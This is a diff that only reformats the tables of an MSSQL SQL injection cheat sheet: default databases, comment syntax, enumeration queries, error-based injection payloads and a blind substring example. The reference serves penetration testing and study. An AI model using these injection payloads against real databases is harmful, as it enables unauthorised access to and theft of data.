@@ -35,26 +35,26 @@
 
 ## MSSQL Default Databases
 
-| Name                  | Description                           |
-|-----------------------|---------------------------------------|
-| pubs                 | Not available on MSSQL 2005           |
-| model                 | Available in all versions             |
-| msdb                 | Available in all versions             |
-| tempdb             | Available in all versions             |
-| northwind             | Available in all versions             |
-| information_schema | Available from MSSQL 2000 and higher  |
+| Name               | Description                          |
+| ------------------ | ------------------------------------ |
+| pubs               | Not available on MSSQL 2005          |
+| model              | Available in all versions            |
+| msdb               | Available in all versions            |
+| tempdb             | Available in all versions            |
+| northwind          | Available in all versions            |
+| information_schema | Available from MSSQL 2000 and higher |
 
 ## MSSQL Comments
 
-| Type                       | Description                       |
-|----------------------------|-----------------------------------|
-| `/* MSSQL Comment */`      | C-style comment                   |
-| `--`                       | SQL comment                       |
-| `;%00`                     | Null byte                         |
+| Type                  | Description     |
+| --------------------- | --------------- |
+| `/* MSSQL Comment */` | C-style comment |
+| `--`                  | SQL comment     |
+| `;%00`                | Null byte       |
 
 ## MSSQL Enumeration
 
-| Description     | SQL Query |
+| Description     | SQL Query                                 |
 | --------------- | ----------------------------------------- |
 | DBMS version    | `SELECT @@version`                        |
 | Database name   | `SELECT DB_NAME()`                        |
@@ -152,12 +152,12 @@ SELECT COL_NAME(OBJECT_ID('<DBNAME>.<TABLE_NAME>'), <INDEX>)
 
 ## MSSQL Error Based
 
-| Name         | Payload         |
-| ------------ | --------------- |
-| CONVERT      | `AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- -` |
-| IN           | `AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~')) -- -` |
-| EQUAL        | `AND 1337=CONCAT('~',(SELECT @@version),'~') -- -` |
-| CAST         | `CAST((SELECT @@version) AS INT)` |
+| Name    | Payload                                                          |
+| ------- | ---------------------------------------------------------------- |
+| CONVERT | `AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- -` |
+| IN      | `AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~')) -- -`         |
+| EQUAL   | `AND 1337=CONCAT('~',(SELECT @@version),'~') -- -`               |
+| CAST    | `CAST((SELECT @@version) AS INT)`                                |
 
 * For integer inputs
 
@@ -187,9 +187,9 @@ SELECT message FROM data WHERE row = 1 and message like 't%'
 
 ### MSSQL Blind With Substring Equivalent
 
-| Function    | Example                                         |
-| ----------- | ----------------------------------------------- |
-| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`        |
+| Function    | Example                                  |
+| ----------- | ---------------------------------------- |
+| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)` |
 
 Examples:
 
